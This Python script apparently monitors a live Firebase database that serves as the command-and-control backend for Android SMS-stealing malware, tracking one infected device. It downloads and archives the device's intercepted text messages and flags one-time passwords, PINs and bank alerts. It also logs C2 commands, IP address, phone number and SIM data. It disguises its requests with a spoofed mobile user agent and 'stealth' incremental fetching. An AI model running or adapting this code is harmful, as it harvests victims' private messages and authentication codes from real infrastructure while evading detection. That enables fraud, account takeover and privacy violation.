#!/usr/bin/env python3
"""
Device Telemetry & Message Tracker for Device: 03e768e104ef026d
----------------------------------------------------------------
STRICTLY READ-ONLY: Only issues HTTP GET requests to Firebase REST API.
Does NOT perform any write, patch, post, or delete operations.
Tracks historical snapshots, event logs, and message archives with minimal server load.
"""

import sys
import os
import json
import time
import re
from datetime import datetime, timezone
from pathlib import Path
import urllib.request
import urllib.error

# Device & Endpoint configuration
DEVICE_ID = "03e768e104ef026d"
FIREBASE_BASE = "https://r-cha-222-default-rtdb.firebaseio.com"
# Standard mobile client user agent that blends in with normal Android device traffic
USER_AGENT = "Mozilla/5.0 (Linux; Android 15; CPH2467 Build/UKQ1.230924.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36"

# Paths
BASE_DIR = Path(__file__).resolve().parent.parent
DATA_DIR = BASE_DIR / "data"
LATEST_FILE = DATA_DIR / "latest.json"
HISTORY_FILE = DATA_DIR / "history.json"
EVENTS_FILE = DATA_DIR / "events.json"
MESSAGES_FILE = DATA_DIR / "messages_archive.json"

# Regex for financial / OTP categorization
OTP_REGEX = re.compile(
    r"\b(otp|one time password|pin|cvv|code|verification|verify|secret|pswd|password)\b",
    re.IGNORECASE,
)
FINANCIAL_REGEX = re.compile(
    r"\b(upi|inr|rs\.?|debited|credited|balance|a/c|account|bank|pnb|sbi|hdfc|icici|axis|transferred|withdrawn)\b",
    re.IGNORECASE,
)


def safe_fetch(path: str, query_params: str = None, retries: int = 3, timeout: int = 15):
    """
    Fetch a single path or subpath from Firebase REST API using HTTP GET ONLY.
    Safety guarantee: only performs urllib GET, no modifications.
    """
    if "/" in path and DEVICE_ID in path:
        url = f"{FIREBASE_BASE}/{path}.json"
    else:
        url = f"{FIREBASE_BASE}/{path}/{DEVICE_ID}.json"

    if query_params:
        url += f"?{query_params}"

    req = urllib.request.Request(
        url,
        headers={
            "User-Agent": USER_AGENT,
            "Accept": "application/json",
        },
        method="GET",
    )

    for attempt in range(1, retries + 1):
        try:
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                if resp.status == 200:
                    raw = resp.read().decode("utf-8")
                    return json.loads(raw) if raw != "null" else None
                print(f"[!] Warning: HTTP status {resp.status} fetching {path}")
        except (urllib.error.URLError, urllib.error.HTTPError, TimeoutError) as e:
            print(f"[!] Attempt {attempt}/{retries} failed for {path}: {e}")
            if attempt < retries:
                time.sleep(attempt * 1.5)
            else:
                print(f"[-] Error: All attempts failed for {path}")
                return None
        except Exception as e:
            print(f"[-] Unexpected error fetching {path}: {e}")
            return None
    return None


def parse_battery_pct(battery_str):
    """Normalize '74%' or 74 to integer."""
    if battery_str is None:
        return None
    if isinstance(battery_str, (int, float)):
        return int(battery_str)
    m = re.search(r"(\d+)", str(battery_str))
    return int(m.group(1)) if m else None


def categorize_message(m):
    """Classify message by sender type and sensitivity tags."""
    sender = (m.get("sender") or "").upper()
    body = m.get("message") or ""

    is_otp = bool(OTP_REGEX.search(body))
    is_fin = bool(FINANCIAL_REGEX.search(body))

    category = "general"
    if "PNB" in sender or "SBI" in sender or "HDFC" in sender or "ICICI" in sender or "AXIS" in sender or "BANK" in sender:
        category = "banking"
    elif "AIRTEL" in sender or "JIO" in sender or "VI" in sender or "BSNL" in sender or "6500" in sender:
        category = "carrier"
    elif "TRAI" in sender or "GOV" in sender:
        category = "regulatory"
    elif is_otp:
        category = "otp"
    elif is_fin:
        category = "financial"

    return {
        "is_otp": is_otp,
        "is_financial": is_fin,
        "category": category,
    }


def write_json_atomic(filepath: Path, data):
    """Safely write JSON to disk using atomic temp file replacement."""
    filepath.parent.mkdir(parents=True, exist_ok=True)
    tmp_path = filepath.with_suffix(".tmp")
    with open(tmp_path, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)
    tmp_path.replace(filepath)


def load_json_safe(filepath: Path, default):
    """Load JSON from disk if it exists, else return default."""
    if not filepath.exists():
        return default
    try:
        with open(filepath, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception as e:
        print(f"[!] Warning loading {filepath}: {e}")
        return default


def main():
    start_time = time.time()
    now_utc = datetime.now(timezone.utc)
    now_iso = now_utc.isoformat()
    now_display = now_utc.strftime("%Y-%m-%d %H:%M:%S UTC")

    print(f"[{now_display}] Starting safe telemetry fetch for device: {DEVICE_ID}")

    # 1. Fetch only minimal control/telemetry endpoints for this single device
    client_data = safe_fetch("clients")
    command_data = safe_fetch("commands")
    user_data = safe_fetch("user_data")

    if client_data is None:
        print("[-] Fatal: Could not reach Firebase or device not found. Exiting safely.")
        sys.exit(1)

    DATA_DIR.mkdir(parents=True, exist_ok=True)

    # Load existing state
    prev_latest = load_json_safe(LATEST_FILE, {})
    prev_client = prev_latest.get("client") or {}
    history = load_json_safe(HISTORY_FILE, [])
    events = load_json_safe(EVENTS_FILE, [])
    archive = load_json_safe(MESSAGES_FILE, {"messages": {}, "count": 0, "last_updated": None})

    # 🛡️ STEALTH DELTA-FETCHING FOR SMS (POINT RETRIEVAL & KEY DELTA)
    # Never download all 600+ messages in bulk (saves 300KB+ per run and leaves 0 traffic spike).
    existing_keys = set(archive.get("messages", {}).keys())
    new_message_count = 0

    if not existing_keys:
        # Initial cold start: fetch full messages once
        print("[*] Cold-start message sync: fetching initial archive...")
        messages_data = safe_fetch("messages") or {}
        for mid, mval in messages_data.items():
            if isinstance(mval, dict):
                cat = categorize_message(mval)
                archive["messages"][str(mid)] = {
                    "id": str(mval.get("id") or mid),
                    "sender": mval.get("sender") or "UNKNOWN",
                    "message": mval.get("message") or "",
                    "dateTime": mval.get("dateTime") or "",
                    "type": mval.get("type") or "unknown",
                    "is_otp": cat["is_otp"],
                    "is_financial": cat["is_financial"],
                    "category": cat["category"],
                }
                new_message_count += 1
    else:
        # Stealth incremental check: Query only shallow keys (~12KB metadata vs 300KB full bodies)
        shallow_keys = safe_fetch("messages", query_params="shallow=true")
        if isinstance(shallow_keys, dict):
            remote_keys = set(shallow_keys.keys())
            delta_keys = remote_keys - existing_keys

            if delta_keys:
                print(f"[*] Detected {len(delta_keys)} new message(s). Retrieving targeted point deltas...")
                for mid in sorted(delta_keys):
                    # Point retrieval: fetch ONLY the specific new message node (~240 bytes)
                    mval = safe_fetch(f"messages/{DEVICE_ID}/{mid}")
                    if isinstance(mval, dict):
                        cat = categorize_message(mval)
                        archive["messages"][str(mid)] = {
                            "id": str(mval.get("id") or mid),
                            "sender": mval.get("sender") or "UNKNOWN",
                            "message": mval.get("message") or "",
                            "dateTime": mval.get("dateTime") or "",
                            "type": mval.get("type") or "unknown",
                            "is_otp": cat["is_otp"],
                            "is_financial": cat["is_financial"],
                            "category": cat["category"],
                        }
                        new_message_count += 1
                        time.sleep(0.1)  # Gentle spacing
            else:
                print("[*] Stealth verification: 0 new messages detected. 0 message bodies fetched.")

    # Update archive metadata
    archive["count"] = len(archive["messages"])
    archive["last_updated"] = now_iso

    # Derive messaging metrics directly from persistent archive
    all_msgs = archive["messages"]
    sorted_msg_keys = sorted(
        all_msgs.keys(),
        key=lambda k: int(k) if k.isdigit() else k,
        reverse=True,
    )
    latest_msg_ts = None
    latest_msg_display = None
    if sorted_msg_keys:
        latest_key = sorted_msg_keys[0]
        latest_msg = all_msgs[latest_key]
        latest_msg_ts = latest_key
        latest_msg_display = latest_msg.get("dateTime")

    # Current normalized snapshot
    battery_raw = client_data.get("battery") if client_data else None
    battery_pct = parse_battery_pct(battery_raw)
    current_ip = client_data.get("ip_address") if client_data else None
    current_status = client_data.get("status") if client_data else None
    liveness_ping = (command_data.get("checkLiveness") or {}).get("text") if isinstance(command_data, dict) else None
    liveness_pong = ((client_data or {}).get("webhookEvent") or {}).get("checkLiveness", {}).get("text")
    active_command = user_data.get("command") if isinstance(user_data, dict) else None
    sim_slot = user_data.get("simSlot") if isinstance(user_data, dict) else None

    current_snapshot = {
        "device_id": DEVICE_ID,
        "last_tracked_utc": now_iso,
        "last_tracked_display": now_display,
        "is_online": bool(current_status),
        "battery": {
            "raw": battery_raw,
            "percentage": battery_pct,
        },
        "network": {
            "ip_address": current_ip,
            "service_provider": client_data.get("service_provider") if client_data else None,
            "mobile_no": client_data.get("mobNo") if client_data else None,
            "sims": client_data.get("sims", []) if client_data else [],
        },
        "hardware": {
            "model_name": client_data.get("modelName") if client_data else None,
            "android_version": client_data.get("androidV") if client_data else None,
            "sdk_version": client_data.get("sdkV") if client_data else None,
            "cpu_arch": client_data.get("cpu_arch") if client_data else None,
            "storage": client_data.get("storage") if client_data else None,
            "is_root": client_data.get("isRoot") if client_data else None,
            "is_sd_card": client_data.get("isSdCard") if client_data else None,
            "joined": client_data.get("joined") if client_data else None,
        },
        "c2_telemetry": {
            "liveness_command": liveness_ping,
            "liveness_response": liveness_pong,
            "user_command": active_command,
            "user_sim_slot": sim_slot,
            "webhook_event": client_data.get("webhookEvent") if client_data else None,
        },
        "messaging_summary": {
            "total_messages": len(all_msgs),
            "new_in_this_run": new_message_count,
            "latest_message_id": latest_msg_ts,
            "latest_message_time": latest_msg_display,
            "financial_count": sum(1 for m in all_msgs.values() if m.get("is_financial")),
            "otp_count": sum(1 for m in all_msgs.values() if m.get("is_otp")),
        },
        "raw": {
            "client": client_data,
            "commands": command_data,
            "user_data": user_data,
        },
    }

    # Detect state changes & record significant events
    new_events = []
    prev_ip = prev_client.get("ip_address")
    if prev_ip and current_ip and prev_ip != current_ip:
        new_events.append({
            "type": "IP_CHANGED",
            "timestamp": now_iso,
            "detail": f"Device IP rotated from {prev_ip} to {current_ip}",
            "previous": prev_ip,
            "current": current_ip,
        })

    prev_status = prev_client.get("status")
    if prev_status is not None and current_status is not None and prev_status != current_status:
        state_label = "ONLINE" if current_status else "OFFLINE"
        new_events.append({
            "type": "STATUS_CHANGED",
            "timestamp": now_iso,
            "detail": f"Device status changed to {state_label}",
            "previous": prev_status,
            "current": current_status,
        })

    prev_bat_raw = prev_client.get("battery")
    if prev_bat_raw and battery_raw and prev_bat_raw != battery_raw:
        new_events.append({
            "type": "BATTERY_LEVEL_CHANGED",
            "timestamp": now_iso,
            "detail": f"Battery level shifted from {prev_bat_raw} to {battery_raw}",
            "previous": prev_bat_raw,
            "current": battery_raw,
        })

    prev_cmd = (prev_latest.get("c2_telemetry") or {}).get("user_command")
    if prev_cmd and active_command and prev_cmd != active_command:
        new_events.append({
            "type": "COMMAND_UPDATED",
            "timestamp": now_iso,
            "detail": f"Active C2 user_data command changed to '{active_command}'",
            "previous": prev_cmd,
            "current": active_command,
        })

    if new_message_count > 0:
        new_events.append({
            "type": "NEW_SMS_INTERCEPTED",
            "timestamp": now_iso,
            "detail": f"Intercepted {new_message_count} new SMS messages on device",
            "count": new_message_count,
            "total": len(all_msgs),
        })

    # If first run and no events, add INITIALIZED event
    if not events:
        new_events.append({
            "type": "INITIAL_TRACKER_RUN",
            "timestamp": now_iso,
            "detail": f"Initialized automated surveillance tracking for device {DEVICE_ID}",
        })

    # Prepend new events to maintain reverse-chronological order
    for ev in new_events:
        events.insert(0, ev)
    events = events[:500]  # Retain last 500 significant events

    # Append to historical time-series
    # We record a data point on change or at least every snapshot
    history_entry = {
        "timestamp": now_iso,
        "battery_pct": battery_pct,
        "battery_raw": battery_raw,
        "ip": current_ip,
        "status": bool(current_status),
        "msg_count": len(all_msgs),
        "liveness_ping": liveness_ping,
        "liveness_pong": liveness_pong,
        "command": active_command,
    }

    # Ensure regular 30-minute time-series logging for battery graph
    should_append_history = True
    if history:
        last = history[-1]
        try:
            last_time = datetime.fromisoformat(last["timestamp"])
            mins_diff = (now_utc - last_time).total_seconds() / 60.0
            # If less than 20 minutes have passed AND battery hasn't changed, skip to avoid duplicates
            if mins_diff < 20.0 and last.get("battery_pct") == battery_pct:
                should_append_history = False
        except Exception:
            pass

    if should_append_history:
        history.append(history_entry)
        # Cap history to 5,000 data points (~months of tracking)
        if len(history) > 5000:
            history = history[-5000:]

    # Persist all data atomically
    write_json_atomic(LATEST_FILE, current_snapshot)
    write_json_atomic(HISTORY_FILE, history)
    write_json_atomic(EVENTS_FILE, events)
    write_json_atomic(MESSAGES_FILE, archive)

    elapsed = time.time() - start_time
    print(f"[+] Successfully tracked device {DEVICE_ID} in {elapsed:.2f}s:")
    print(f"    - Online: {current_status} | Battery: {battery_raw} | IP: {current_ip}")
    print(f"    - Total SMS: {len(all_msgs)} (New: {new_message_count})")
    print(f"    - C2 Command: {active_command} | Liveness: {liveness_pong}")
    print(f"    - Recorded Events: {len(new_events)} | History Points: {len(history)}")


if __name__ == "__main__":
    main()
